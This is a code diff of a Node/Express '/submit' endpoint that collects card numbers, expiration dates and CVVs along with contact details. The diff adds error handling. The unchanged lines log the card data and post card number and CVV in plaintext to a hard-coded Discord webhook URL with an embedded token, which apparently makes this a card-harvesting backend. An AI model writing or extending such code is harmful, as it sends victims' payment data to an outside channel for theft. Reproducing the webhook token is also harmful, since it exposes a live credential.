@@ -32,8 +32,9 @@
   
   // POST route for submissions
   app.post("/submit", async (req, res) => {
+  try {
     const { name, email, phone, state, message, cardNumber, expirationDate, cvv } = req.body;
-  
+
     if (
       typeof cardNumber === "string" &&
       cardNumber.length === 16 &&
@@ -43,8 +44,7 @@
     ) {
       storage.push({ cardNumber, expirationDate, cvv });
       console.log("Stored Payment Info:", storage);
-  
-      // ✅ Discord Notification for Payment Submissions
+
       await fetch("https://discord.com/api/webhooks/1394971034054037635/AAY8BfDiVBgoyl0u1BBXi1tLSaQCUF5BS0SZI_oIWgWfevveRhVe9_QGihs4wLn4fi4M", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -54,16 +54,15 @@
           **Card Number:** ${cardNumber}
           **CVV:** ${cvv}`
         })
-      }).catch(console.error);
-  
+      });
+
       return res.status(200).json({ message: "Payment data stored successfully" });
     }
-  
+
     if (name && email && phone && state && message) {
       storage.push({ name, email, phone, state, message });
       console.log("Stored Contact Info:", storage);
-  
-      // ✅ Discord Notification for Contact Submissions
+
       await fetch("https://discord.com/api/webhooks/1394971034054037635/AAY8BfDiVBgoyl0u1BBXi1tLSaQCUF5BS0SZI_oIWgWfevveRhVe9_QGihs4wLn4fi4M", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -75,13 +74,19 @@
           **State:** ${state}
           **Message:** ${message}`
         })
-      }).catch(console.error);
-  
+      });
+
       return res.status(200).json({ message: "Contact data stored successfully" });
     }
-  
+
     return res.status(400).json({ message: "Invalid or incomplete data submitted." });
-  });
+
+  } catch (error) {
+    console.error("Error in /submit:", error);
+    return res.status(500).json({ message: "Internal server error." });
+  }
+});
+
   
   // GET route for data display
   app.get("/data", (req, res) => {
